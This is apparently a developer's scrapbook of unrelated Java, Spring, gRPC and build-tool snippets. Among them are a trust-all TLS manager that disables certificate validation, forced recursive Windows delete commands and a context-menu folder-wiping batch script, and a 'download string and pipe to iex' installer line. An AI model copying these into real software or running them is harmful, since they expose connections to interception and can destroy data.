            CharBuffer chars = StandardCharsets.UTF_8.decode(bb);
            jwtChars = this.extract(chars, 1); // jwt is always first
            // Clear things up as best we can
            chars.clear();
            for (int i=0; i<chars.capacity();i++) {
                chars.put('\0');
            }
            bb.clear();
            for (int i=0;i<data.length;i++) {
                data[i] = 0;
            }

            return jwtChars;
        } catch (Exception exp) {
            throw new IllegalStateException("problem reading jwt", exp);
        }
    }
}
==============================================================================================================
echo "MAVEN_OPTS='-Xmx2g -XX:+TieredCompilation -XX:TieredStopAtLevel=1'" > ~/.mavenrc
==============================================================================================================
public class BasketItemDeserializer extends JsonDeserializer {
  @Override
  public BasketItem deserialize(JsonParser jsonParser, DeserializationContext deserializationContext)
    throws IOException, JsonProcessingException {
    ObjectCodec objectCodec = jsonParser.getCodec();
    JsonNode jsonNode = objectCodec.readTree(jsonParser);
 
    BasketItem basketItem = new BasketItem();
    basketItem.setProduct(jsonNode.get("detail").get("product").asText());
    basketItem.setCode(jsonNode.get("detail").get("code").asText());
    basketItem.setAmount(jsonNode.get("amount").asInt());
 
    return basketItem;
  }
}
 
public class BasketItemSerializer extends JsonSerializer {
  @Override
  public void serialize(
    BasketItem basketItem, JsonGenerator jsonGenerator, SerializerProvider serializerProvider)
      throws IOException, JsonProcessingException {
    jsonGenerator.writeStartObject();
    jsonGenerator.writeObjectFieldStart("detail");
    jsonGenerator.writeStringField("product", basketItem.getProduct());
    jsonGenerator.writeStringField("code", basketItem.getCode());
    jsonGenerator.writeEndObject();
    jsonGenerator.writeNumberField("amount", basketItem.getAmount());
    jsonGenerator.writeEndObject();
  }
}
 
@Service
public class BasketItemJsonModule extends SimpleModule {
  public BasketItemJsonModule() {
    this.addDeserializer(BasketItem.class, new BasketItemDeserializer());
    this.addSerializer(BasketItem.class, new BasketItemSerializer());
  }
}
==============================================================================================================
import java.security.SecureRandom;
import java.security.cert.X509Certificate;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import io.nats.client.Options;

public class SSLUtils {
    private static TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() {
        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
            return null;
        }

        public void checkClientTrusted(X509Certificate[] certs, String authType) {
        }

        public void checkServerTrusted(X509Certificate[] certs, String authType) {
        }
    } };

    public static SSLContext createOpenTLSContext() {
        SSLContext context = null;

        try {
            context = SSLContext.getInstance(Options.DEFAULT_SSL_PROTOCOL);
            context.init(null, trustAllCerts, new SecureRandom());
        } catch (Exception e) {
            context = null;
        }

        return context;
    }
}
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
		// Access the Client service to retrieve the list of clients and
		// the list of clients grouped by country
		List<Client> clientList = clientService.getClientList();
		List<ClientByCountry> clientByCountryList = clientService.getClientByCountryList();

		// Create a JasperReport data source and ...
		JRBeanCollectionDataSource clientDS = new JRBeanCollectionDataSource(clientList);
		JRBeanCollectionDataSource clientByCountryDS = new JRBeanCollectionDataSource(clientByCountryList);

		// ... add them to the parameters Map object
		Map<String, Object> parameters = new HashMap<String, Object>();
		parameters.put("SUBREPORT_DIR", "/");
		parameters.put("CLIENT_DS", clientDS);
		parameters.put("BY_COUNTRY_DS", clientByCountryDS);

		// Call fillReport method passing the main report and the parameters
		// To finish, export the report to a PDF file
		JasperPrint jasperPrint = JasperFillManager.fillReport(new ClassPathResource("/clients-example.jasper").getInputStream(), parameters, new JREmptyDataSource());
		JRPdfExporter pdfExporter = new JRPdfExporter();
		pdfExporter.setExporterInput(new SimpleExporterInput(jasperPrint));
		pdfExporter.setExporterOutput(new SimpleOutputStreamExporterOutput(reportOutput));
		pdfExporter.exportReport();
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
     <dependency>
            <groupId>com.googlecode.java-diff-utils</groupId>
            <artifactId>diffutils</artifactId>
            <version>1.2.1</version>
        </dependency>
==============================================================================================================
# Database
spring.datasource.url = jdbc:sqlite:clients.db
spring.datasource.driver-class-name = org.sqlite.JDBC
spring.jpa.properties.hibernate.dialect = org.hibernate.dialect.SQLiteDialect
spring.jpa.hibernate.ddl-auto=update

# Report PDF output
report-output = /tmp/report.pdf
==============================================================================================================
==============================================================================================================
==============================================================================================================
{
    "provider": {
        "name": "Our Provider"
    },
    "consumer": {
        "name": "Our Little Consumer"
    },
    "interactions": [
        {
            "description": "a request for json data",
            "request": {
                "method": "GET",
                "path": "/provider.json",
                "query": {
                    "validDate": [
                        "2018-04-10T12:34:28.839"
                    ]
                }
            },
            "response": {
                "status": 200,
                "headers": {
                    "Content-Type": "application/json"
                },
                "body": {
                    "test": "NO",
                    "date": "2013-08-16T15:31:20+10:00",
                    "count": 100
                }
            },
            "providerStates": [
                {
                    "name": "data count > 0"
                }
            ]
        }
    ],
    "metadata": {
        "pact-specification": {
            "version": "3.0.0"
        },
        "pact-jvm": {
            "version": "3.5.14"
        }
    }
}
==============================================================================================================
Start Eureka: java -jar eureka-server/target/eureka-server-1.0-SNAPSHOT.jar
Start gRPC Server #1: java -jar grpc-server/target/springboot-grpc-server-1.0-SNAPSHOT.jar --server.port=9090
Start gRPC Server #2: java -jar grpc-server/target/springboot-grpc-server-1.0-SNAPSHOT.jar --server.port=9091
Start gRPC Client: java -jar target/springboot-grpc-client-1.0-SNAPSHOT.jar
==============================================================================================================
import com.example.grpc.EchoRequest;
import com.example.grpc.EchoResponse;
import com.example.grpc.EchoServiceGrpc;
import io.grpc.Server;
import io.grpc.ServerBuilder;
import io.grpc.stub.StreamObserver;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.logging.Logger;

/**
 * Created by rayt on 5/16/16.
 */
public class EchoServer {
  static public void main(String[] args) throws IOException, InterruptedException {

    Server server = ServerBuilder.forPort(8080)
        .addService(new EchoServiceImpl()).build();

    System.out.println("Starting server...");
    server.start();
    System.out.println("Server started!");
    server.awaitTermination();
  }
}

class EchoServiceImpl extends EchoServiceGrpc.EchoServiceImplBase {
  private static Logger LOGGER = Logger.getLogger(EchoServiceImpl.class.getName());

  @Override
  public void echo(EchoRequest request, StreamObserver<EchoResponse> responseObserver) {
    try {
      String from = InetAddress.getLocalHost().getHostAddress();
      System.out.println("Received: " + request.getMessage());
      responseObserver.onNext(EchoResponse.newBuilder()
          .setFrom(from)
          .setMessage(request.getMessage())
          .build());
      responseObserver.onCompleted();
    } catch (UnknownHostException e) {
      responseObserver.onError(e);
    }
  }
}

server {
    listen 80 http2;
 
    location / {
        grpc_pass grpc://echo-server:8080;
    }
}

version: '3'
services:
  nginx-grpc:
    build: .
    ports:
    - "8080:80"
    command: nginx -g 'daemon off;'
  echo-server:
    image: saturnism/echo-server:latest
    ports:
    - "8080"
==============================================================================================================
  del /f/q/s *.* > nul
  rmdir /q/s your-folder-name
==============================================================================================================
https://www.baeldung.com/java-weekly-318?utm_source=email-newsletter&utm_medium=email&utm_campaign=jww
==============================================================================================================
https://habr.com/ru/post/337716/

syntax = "proto3";

package library;

service LibraryService {
  rpc AddBook(AddBookRequest) returns (AddBookResponse)
}

message AddBookRequest {
  message Author {
    string name = 1;
    string surname = 2;
  }
  string isbn = 1;
  repeated Author authors = 2;
}

message AddBookResponse {
  int64 id = 1;
}
==============================================================================================================
@ECHO OFF
ECHO Delete Folder: %CD%?
PAUSE
SET FOLDER=%CD%
CD /
DEL /F/Q/S "%FOLDER%" > NUL
RMDIR /Q/S "%FOLDER%"
EXIT

HKEY_CLASSES_ROOT\Directory\shell\
cmd /c "cd %1 && quick_delete.bat"

==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
1] Delete the desired file

When the CMD window opens, navigate to the folder where the file is available. You will have to use the “cd” or change directory command. Then, use the following command with options in the prompt:

DEL /F /A <file path with extension>
Here:

/F stands for force delete
/A selects only the files with ready for archiving attribute
2] Delete the desired folder

Navigate to the folder containing the folder you wish to delete by using the ‘cd’ command. Type the following command in the Command Prompt:

RD /S <folder path>
Here:

RD removes the folder from the directory.
/S Removes all subfolders and files
==============================================================================================================
$ sudo cp src/cp /usr/local/bin/cpg
$ sudo cp src/mv /usr/local/bin/mvg

#!/bin/sh
cp_p()
{
   strace -q -ewrite cp -- "${1}" "${2}" 2>&1 \
      | awk '{
        count += $NF
            if (count % 10 == 0) {
               percent = count / total_size * 100
               printf "%3d%% [", percent
               for (i=0;i<=percent;i++)
                  printf "="
               printf ">"
               for (i=percent;i<100;i++)
                  printf " "
               printf "]\r"
            }
         }
         END { print "" }' total_size=$(stat -c '%s' "${1}") count=0
}

https://github.com/Xfennec/progress
==============================================================================================================
import com.google.common.collect.Maps;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.stereotype.Component;
import org.springframework.stereotype.Repository;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

@Repository
public class MyDataRepository {
	private final JdbcTemplate jdbcTemplate;

	public MyDataRepository(JdbcTemplate jdbcTemplate) {
		this.jdbcTemplate = jdbcTemplate;
	}

	public void insert(String key, String value) {
		jdbcTemplate.update("insert into kv_table values (?, ?)", key, value);
	}

	public List<String> findAll() {
		return jdbcTemplate.query("select * from kv_table", (rs, rowNum) -> {
			return rs.getString(1);
		});
	}
}
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
import org.junit.internal.runners.statements.Fail;
import org.junit.runners.model.FrameworkMethod;
import org.junit.runners.model.InitializationError;
import org.junit.runners.model.Statement;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;

import java.util.function.Predicate;


public class SpringRunnerWithGlobalExpectedExceptionInspected extends SpringJUnit4ClassRunner {
    private final Class<? extends Predicate<Throwable>> expectedExceptionInspector;

    public SpringRunnerWithGlobalExpectedExceptionInspected(Class<?> clazz) throws InitializationError {
        super(clazz);
        ExpectedStartupExceptionWithInspector annotation = clazz.getAnnotation(ExpectedStartupExceptionWithInspector.class);
        if (annotation != null) {
            expectedExceptionInspector = annotation.value();
        } else {
            throw new IllegalArgumentException("Missing " + ExpectedStartupExceptionWithInspector.class.getName() + " on " + clazz.getName());
        }
    }

    @Override
    protected Statement methodBlock(FrameworkMethod frameworkMethod) {
        Statement result = super.methodBlock(frameworkMethod);
        try {
            return new ExpectExceptionWithPredicate(result, expectedExceptionInspector.newInstance());
        } catch (InstantiationException | IllegalAccessException e) {
            return new Fail(e);
        }
    }

}
==============================================================================================================
const express = require('express');
const mongojs = require('mongojs');

const app = express();
const db = mongojs('ChartsDB',['charts']);

app.get('/chart.json',(req,res) =>{
	db.charts.find({_id:mongojs.ObjectId("578a7c835df8a2cef0428e02")}, (err,r) =>{
		if(err){
			res.sendStatus(404);
		}else{
			res.header("Access-Control-Allow-Origin", "*");
  		res.header("Access-Control-Allow-Headers", "X-Requested-With");
  		res.send(JSON.stringify(r[0]));
		}
	});
});


app.listen(3001, function(){
	console.log("we are running on prot 3001!");
});
==============================================================================================================
    obj.map(o -> (Runnable) () -> o.setAvailable(true))
       .orElse(() -> logger.fatal("Object not available"))
       .run();
or

    obj.map(o -> (Consumer<Object>) c -> o.setAvailable(true))
       .orElse(o -> logger.fatal("Object not available"))
       .accept(null);
or

    obj.map(o -> (Supplier<Object>) () -> {
            o.setAvailable(true);
            return null;
    }).orElse(() () -> {
            logger.fatal("Object not available")
            return null;
    }).get();
==============================================================================================================
module.exports = function(originalModule) {
	if (!originalModule.webpackPolyfill) {
		var module = Object.create(originalModule);
		// module.parent = undefined by default
		if (!module.children) module.children = [];
		Object.defineProperty(module, "loaded", {
			enumerable: true,
			get: function() {
				return module.l;
			}
		});
		Object.defineProperty(module, "id", {
			enumerable: true,
			get: function() {
				return module.i;
			}
		});
		Object.defineProperty(module, "exports", {
			enumerable: true
		});
		module.webpackPolyfill = 1;
	}
	return module;
};

==============================================================================================================
npm install --save-dev babel-core babel-preset-env
npm install --save-dev @babel/core @babel/preset-env
==============================================================================================================
       <dependency>
            <groupId>io.reactivex.rxjava2</groupId>
            <artifactId>rxjava</artifactId>
            <version>${rx.java2.version}</version>
        </dependency>
        <dependency>
            <groupId>io.projectreactor</groupId>
            <artifactId>reactor-test</artifactId>
            <version>${reactor-core.version}</version>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>io.projectreactor</groupId>
            <artifactId>reactor-core</artifactId>
            <version>${reactor-core.version}</version>
        </dependency>
==============================================================================================================
==============================================================================================================
import static org.junit.Assert.assertEquals;
import static org.junit.Assert.fail;

import java.util.HashMap;
import java.util.Map;

import org.jbehave.core.annotations.Alias;
import org.jbehave.core.annotations.Composite;
import org.jbehave.core.annotations.Given;
import org.jbehave.core.annotations.Named;
import org.jbehave.core.annotations.Then;
import org.jbehave.core.annotations.When;
import org.jbehave.core.model.ExamplesTable;
import org.jbehave.core.steps.Parameters;

public class ExampleSteps {
	private int x;
	private Map<String, Integer> variables;
	private int result;

	@Given("a variable x with value $value")
	@Alias("ist die Variable x mit dem Wert $value")
	public void givenXValue(@Named("value") int value) {
		x = value;
	}

	@When("I multiply x by $value")
	@Alias("ich x mit $value multipliziere")
	public void whenImultiplyXBy(@Named("value") int value) {
		x = x * value;
	}

	@When("I multiply x with all of:$param")
	@Alias("ich x mit folgenden Werten multipliziere:$param")
	public void whenImultiplyXByOneOf(ExamplesTable param) {
		for (Parameters p : param.getRowsAsParameters()) {
			Integer value = p.valueAs("Value", Integer.class);
			x = x * value;
		}
	}

	@Then("x should equal $value")
	@Alias("ist x gleich $value")
	public void thenXshouldBe(@Named("value") int value) {
		assertEquals(value, x);
	}

	@Given("some initialization")
	public void givenSomeInitialization() {
		System.out.println("Init");
	}

	@Given("a Greeting to $somebody")
	public void givenAGreetingToSomebody(@Named("somebody") String somebody) {
		System.out.println("Hello " + somebody);
	}

	@Given("the variables: $variables")
	public void givenTheVariables(ExamplesTable table) {
		variables = new HashMap<>();
		for (Map<String, String> row : table.getRows()) {
			variables.put(row.get("name"), Integer.valueOf(row.get("value")));
		}
	}

	@When("all variables are multiplied")
	public void allVariablesAreMultipled() {
		result = 1;
		for (Integer variable : variables.values()) {
			result *= variable;
		}
	}

	@Then("the result should be $result")
	public void theResultShouldBe(@Named("result") String result) {
		assertEquals(result, "" + this.result);
	}

	@Given("a complex situation")
	@Composite(steps = { "Given a variable x with value 1",
			"When I multiply x by 5" })
	public void aComplexSituation() {
		// This is complex case with single method representing Composite step and Given step at the same time
	}

	@When("this step fails")
	public void thisStepFails() {
		fail("this step failed on purpose");
	}

	@Then("this step is not executed")
	public void thisStepIsNotExecuted() {
		// This step is to help document a scenario where a prior step is expected to fail and this step will not execute.
	}
}

import java.sql.SQLException;

import org.jbehave.core.annotations.AfterScenario;
import org.jbehave.core.annotations.AfterScenario.Outcome;
import org.jbehave.core.annotations.AfterStories;
import org.jbehave.core.annotations.AfterStory;
import org.jbehave.core.annotations.BeforeScenario;
import org.jbehave.core.annotations.BeforeStories;
import org.jbehave.core.annotations.BeforeStory;
import org.jbehave.core.annotations.ScenarioType;

public class InitSteps {
	@BeforeStories
	public void doSomethingBeforeStories() throws SQLException {
		System.out.println("InitSteps.doSomethingBeforeStories()");
		throw new SQLException("DU doof!");
	}

	@BeforeStory(uponGivenStory = true)
	public void doSomethingBeforeGivenStories() {
		System.out.println("InitSteps.doSomethingBeforeGivenStories()");
	}

	@BeforeStory(uponGivenStory = false)
	public void doSomethingBeforeRegularStories() {
		System.out.println("InitSteps.doSomethingBeforeRegularStories()");
	}

	@BeforeScenario(uponType = ScenarioType.NORMAL)
	public void doSomethingBeforeNormalScenario() {
		System.out.println("InitSteps.doSomethingBeforeNormalScenario()");
	}

	@BeforeScenario(uponType = ScenarioType.EXAMPLE)
	public void doSomethingBeforeExample() {
		System.out.println("InitSteps.doSomethingAfterAnyNormalScenario()");
	}

	@AfterScenario(uponType = ScenarioType.EXAMPLE, uponOutcome = Outcome.ANY)
	public void doSomethingAfterAnyExampleScenario() {
		System.out.println("InitSteps.doSomethingAfterAnyExampleScenario()");
	}

	@AfterScenario(uponType = ScenarioType.EXAMPLE, uponOutcome = Outcome.FAILURE)
	public void doSomethingAfterFailedExampleScenario() {
		System.out.println("InitSteps.doSomethingAfterFailedExampleScenario()");
	}

	@AfterScenario(uponType = ScenarioType.EXAMPLE, uponOutcome = Outcome.SUCCESS)
	public void doSomethingAfterSuccessfulExampleScenario() {
		System.out
				.println("InitSteps.doSomethingAfterSuccessfulExampleScenario()");
	}

	@AfterScenario(uponType = ScenarioType.NORMAL, uponOutcome = Outcome.ANY)
	public void doSomethingAfterAnyNormalScenario() {
		System.out.println("InitSteps.doSomethingAfterAnyNormalScenario()");
	}

	@AfterScenario(uponType = ScenarioType.NORMAL, uponOutcome = Outcome.FAILURE)
	public void doSomethingAfterFailedNormalScenario() {
		System.out.println("InitSteps.doSomethingAfterFailedNormalScenario()");
	}

	@AfterScenario(uponType = ScenarioType.NORMAL, uponOutcome = Outcome.SUCCESS)
	public void doSomethingAfterSuccessfulNormalScenario() {
		System.out
				.println("InitSteps.doSomethingAfterSuccessfulNormalScenario()");
	}

	@AfterStory(uponGivenStory = false)
	public void doSomethingAfterRegularStories() {
		System.out.println("InitSteps.doSomethingAfterRegularStories()");
	}

	@AfterStory(uponGivenStory = true)
	public void doSomethingAfterGivenStories() {
		System.out.println("InitSteps.doSomethingAfterGivenStories()");
	}

	@AfterStories
	public void doSomethingAfterStories() {
		System.out.println("InitSteps.doSomethingAfterStories()");
	}
}
==============================================================================================================
Set-ExecutionPolicy RemoteSigned -scope CurrentUser

Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://get.scoop.sh')

# or shorter
iwr -useb get.scoop.sh | iex

export MAVEN_OPTS="-Xmx1024m"
export MAVEN_OPTS="$MAVEN_OPTS -Xmx1024m"

        <plugin>
            <groupId>org.jbehave</groupId>
            <artifactId>jbehave-maven-plugin</artifactId>
            <version>${jbehave.core.version}</version>
            <executions>
                <execution>
                    <id>unpack-view-resources</id>
                    <phase>process-resources</phase>
                    <goals>
                        <goal>unpack-view-resources</goal>
                    </goals>
                </execution>
                <execution>
                    <id>embeddable-stories</id>
                    <phase>integration-test</phase>
                    <configuration>
                        <includes>
                            <include>${embeddables}</include>
                        </includes>
                        <excludes/>
                        <systemProperties>
                            <property>
                                <name>file.encoding</name>
                                <value>${project.build.sourceEncoding}</value>
                            </property>
                        </systemProperties>
                        <ignoreFailureInStories>true</ignoreFailureInStories>
                        <ignoreFailureInView>false</ignoreFailureInView>
                        <threads>1</threads>
                        <metaFilters>
                            <metaFilter/>
                        </metaFilters>
                    </configuration>
                    <goals>
                        <goal>run-stories-as-embeddables</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>
==============================================================================================================
sudo apt-add-repository ppa:qameta/allure
sudo apt-get update 
sudo apt-get install allure
==============================================================================================================
mvn clean test - run your tests
You can generate a report using one of the following command:

mvn allure:serve
Report will be generated into temp folder. Web server with results will start.

mvn allure:report
==============================================================================================================
--add-modules java.xml.bind
-XX:+IgnoreUnrecognizedVMOptions

Должно работать норм, если создать файлик allure.properties и прописать в нем allure.results.directory=target/allure-results
==============================================================================================================
protoc --quickbuf_out= \
    indent=4, \
    input_order=quickbuf, \
    replace_package=my.namespace.protobuf|my.namespace.quickbuf: \
    ./path/to/generate`.
	
https://adityasridhar.com/posts/how-to-create-simple-rest-apis-with-springboot
==============================================================================================================
@Component
@Aspect
public class PublishingAspect {
 
    private ApplicationEventPublisher eventPublisher;
 
    @Autowired
    public void setEventPublisher(ApplicationEventPublisher eventPublisher) {
        this.eventPublisher = eventPublisher;
    }
 
    @Pointcut("@target(org.springframework.stereotype.Repository)")
    public void repositoryMethods() {}
 
    @Pointcut("execution(* *..create*(Long,..))")
    public void firstLongParamMethods() {}
 
    @Pointcut("repositoryMethods() && firstLongParamMethods()")
    public void entityCreationMethods() {}
 
    @AfterReturning(value = "entityCreationMethods()", returning = "entity")
    public void logMethodCall(JoinPoint jp, Object entity) throws Throwable {
        eventPublisher.publishEvent(new FooCreationEvent(entity));
    }
}
==============================================================================================================
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.jms.DefaultJmsListenerContainerFactoryConfigurer;
import org.springframework.context.annotation.Bean;
import org.springframework.jms.annotation.EnableJms;
import org.springframework.jms.config.DefaultJmsListenerContainerFactory;
import org.springframework.jms.config.JmsListenerContainerFactory;
import org.springframework.jms.support.converter.MappingJackson2MessageConverter;
import org.springframework.jms.support.converter.MessageConverter;
import org.springframework.jms.support.converter.MessageType;
import org.springframework.scheduling.annotation.EnableScheduling;

import javax.jms.ConnectionFactory;

/**
 * Created by User on 11/12/2016.
 */

@SpringBootApplication
@EnableJms
@EnableScheduling
public class SpringBootWebApplication {

    public static void main(String[] args) {
        SpringApplication.run(SpringBootWebApplication.class, args);
    }

    @Bean
    public JmsListenerContainerFactory<?> myFactory(ConnectionFactory connectionFactory,
                                                    DefaultJmsListenerContainerFactoryConfigurer configurer) {
        DefaultJmsListenerContainerFactory factory = new DefaultJmsListenerContainerFactory();
        // This provides all boot's default to this factory, including the message converter
        configurer.configure(factory, connectionFactory);
        // You could still override some of Boot's default if necessary.
        return factory;
    }

    @Bean // Serialize message content to json using TextMessage
    public MessageConverter jacksonJmsMessageConverter() {
        MappingJackson2MessageConverter converter = new MappingJackson2MessageConverter();
        converter.setTargetType(MessageType.TEXT);
        converter.setTypeIdPropertyName("_type");
        return converter;
    }

    /*public static void main(String[] args) {
        // Launch the application
        ConfigurableApplicationContext context = SpringApplication.run(Application.class, args);
        JmsTemplate jmsTemplate = context.getBean(JmsTemplate.class);
        // Send a message with a POJO - the template reuse the message converter
        System.out.println("Sending an email message.");
        jmsTemplate.convertAndSend("mailbox", "12345");
    }*/
}
==============================================================================================================
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.annotation.Order;
import org.springframework.web.servlet.config.annotation.CorsRegistry;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;
import ro.fmi.rpg.interceptor.JWTInterceptor;
import ro.fmi.rpg.interceptor.LoggerInterceptor;

/**
 * Created by User on 11/12/2016.
 */
@Configuration
public class MvcConfig extends WebMvcConfigurerAdapter {

    @Autowired
    private JWTInterceptor jwtInterceptor;

    @Autowired
    private LoggerInterceptor loggerInterceptor;

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(loggerInterceptor).addPathPatterns("/**");
        registry.addInterceptor(jwtInterceptor).addPathPatterns("/api/achievements");
        registry.addInterceptor(jwtInterceptor).addPathPatterns("/api/categories");
        registry.addInterceptor(jwtInterceptor).addPathPatterns("/api/tasks/**");
        registry.addInterceptor(jwtInterceptor).addPathPatterns("/api/user");
        registry.addInterceptor(jwtInterceptor).addPathPatterns("/api/friends/**");
        registry.addInterceptor(jwtInterceptor).addPathPatterns("/api/alerts/**");
        registry.addInterceptor(jwtInterceptor).addPathPatterns("/api/chart/**");
    }

    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/**")
                .allowedMethods("PUT", "DELETE", "OPTIONS", "GET", "POST");
    }

}

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.messaging.simp.SimpMessagingTemplate;
import org.springframework.web.bind.annotation.*;
import ro.fmi.rpg.exception.RPGException;

/**
 * Created by User on 1/8/2017.
 */
@RestController
public class TestSockCtrl {

    @Autowired
    private SimpMessagingTemplate template;

    @RequestMapping(path = "/test/{topic}", method = RequestMethod.POST)
    public void getLoggedInUser(@PathVariable("topic") String topic, @RequestBody String message) throws RPGException {
        template.convertAndSend("/topic/" + topic, message);
    }

}

https://github.com/cristirosu/rpg-scheduler-backend

import javassist.NotFoundException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;
import ro.fmi.rpg.exception.RPGException;
import ro.fmi.rpg.service.TaskService;
import ro.fmi.rpg.to.task.CategoryModel;
import ro.fmi.rpg.to.task.TaskModel;

import java.text.ParseException;
import java.util.List;

/**
 * Created by User on 12/11/2016.
 */
@CrossOrigin
@RestController
@RequestMapping("/api")
public class TaskController {

    private Logger LOG = LoggerFactory.getLogger(AuthenticationController.class);

    @Autowired
    private TaskService taskService;

    @CrossOrigin
    @RequestMapping(path = "/tasks", method = RequestMethod.GET)
    public List<TaskModel> getTasksWithCategories() throws RPGException, ParseException {
        return taskService.getTasks();
    }

    @CrossOrigin
    @RequestMapping(path = "/tasks", method = RequestMethod.PUT)
    public List<TaskModel> updateTask(@RequestBody TaskModel taskModel) throws RPGException, ParseException {
        return taskService.updateTask(taskModel);
    }

    @CrossOrigin
    @RequestMapping(path = "/tasks/{taskId:.+}/status", method = RequestMethod.PUT)
    public List<TaskModel> finishTask(@PathVariable("taskId") int taskId) throws RPGException, ParseException, NotFoundException {
        return taskService.finishTask(taskId);
    }

    @CrossOrigin
    @RequestMapping(path = "/tasks/{taskId:.+}", method = RequestMethod.DELETE)
    public List<TaskModel> deleteTask(@PathVariable("taskId")int taskId) throws RPGException, ParseException, NotFoundException {
        return taskService.deleteTask(taskId);
    }

    @PutMapping(path = "/tasks/{taskId:.+}/deadline")
    public void updateTaskDeadline(@RequestBody TaskModel taskModel) throws ParseException {
        taskService.updateTaskDeadline(taskModel);
    }

}

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;
import ro.fmi.rpg.exception.RPGException;
import ro.fmi.rpg.service.TaskService;
import ro.fmi.rpg.to.login.LoginRequest;
import ro.fmi.rpg.to.task.TaskModel;

import java.util.List;

/**
 * Created by User on 12/19/2016.
 */
@RestController
@RequestMapping("/api")
public class SyncController {

    @Autowired
    private TaskService taskService;

    @CrossOrigin
    @RequestMapping(path = "/sync", method = RequestMethod.POST)
    public List<TaskModel> getTasksForSync(@RequestBody LoginRequest loginRequest) throws RPGException {
        return taskService.getTasksForSync(loginRequest.getEmail(), loginRequest.getPassword());
    }

}

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;
import ro.fmi.rpg.exception.RPGException;
import ro.fmi.rpg.service.LeaderBoardService;
import ro.fmi.rpg.service.friends.FriendsService;
import ro.fmi.rpg.to.FriendModel;
import ro.fmi.rpg.to.LeaderBoardModel;

import java.util.List;

/**
 * Created by User on 1/8/2017.
 */
@RestController
@RequestMapping("/api")
public class FriendsController {

    @Autowired
    private FriendsService friendsService;

    @Autowired
    private LeaderBoardService leaderBoardService;

    @RequestMapping(path = "/friends", method = RequestMethod.GET)
    public List<FriendModel> getFriends() throws RPGException {
        return friendsService.getFriends();
    }

    @RequestMapping(path = "/friends/{friendId}", method = RequestMethod.DELETE)
    public void deleteFriend(@PathVariable("friendId") Integer friendId) throws RPGException {
        friendsService.deleteFriend(friendId);
    }

    @RequestMapping(path = "/friends/request/{emailAddress:.+}", method = RequestMethod.POST)
    public void addFriend(@PathVariable("emailAddress") String emailAddress) throws RPGException {
        friendsService.addFriend(emailAddress);
    }

    @RequestMapping(path = "/friends/scoreBoard", method = RequestMethod.GET)
    public List<LeaderBoardModel> getScoreBoard() throws RPGException {
        return leaderBoardService.getLeaderBoard();
    }

}
==============================================================================================================
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.mail.javamail.MimeMessageHelper;
import org.springframework.stereotype.Service;
import ro.fmi.rpg.dao.entity.User;

import javax.mail.MessagingException;
import javax.mail.internet.MimeMessage;

/**
 * Created by User on 11/13/2016.
 */
@Service
public class EmailService {

    private static final String FROM = "dumpaul33@gmail.com";

    private Logger LOG = LoggerFactory.getLogger(EmailService.class);

    @Value("${dev}")
    private Boolean devMode;

    @Autowired
    private JavaMailSender javaMailSender;

    public void send(EmailType emailType, User user) {
        LOG.info("Trying to send email of type " + emailType + " to " + user.getEmail());
        String emailContent = getEmailContent(emailType, user);
        MimeMessage mail = javaMailSender.createMimeMessage();
        try {
            MimeMessageHelper helper = new MimeMessageHelper(mail, true);
            helper.setTo(user.getEmail());
            helper.setFrom(FROM);
            helper.setSubject(emailType.getTitle());
            helper.setText(emailContent);
        } catch (MessagingException e) {
            e.printStackTrace();
        }
        javaMailSender.send(mail);
        LOG.info("Sent email to " + user.getEmail() + " for content \"" + emailContent + "\"");
    }

    public void sendEmailWithContent(EmailType emailType, User user, String content) {
        LOG.info("Trying to send email of type " + emailType + " to " + user.getEmail());
        MimeMessage mail = javaMailSender.createMimeMessage();
        try {
            MimeMessageHelper helper = new MimeMessageHelper(mail, true);
            helper.setTo(user.getEmail());
            helper.setFrom(FROM);
            helper.setSubject(emailType.getTitle());
            helper.setText(content);
            helper.setText(content);
        } catch (MessagingException e) {
            e.printStackTrace();
        }
        javaMailSender.send(mail);
        LOG.info("Sent email to " + user.getEmail() + " for content \"" + content + "\"");
    }

    private String getEmailContent(EmailType emailType, User user){
        switch (emailType) {
            case ACTIVATION_EMAIL: {
                if(devMode){
                    return "http://localhost:3000/#/activation/" + user.getId();
                } else {
                    return "http://cristi.red:8080/#/activation/" + user.getId();
                }
            }
            default: {
                return "Empty email";
            }
        }
    }
}

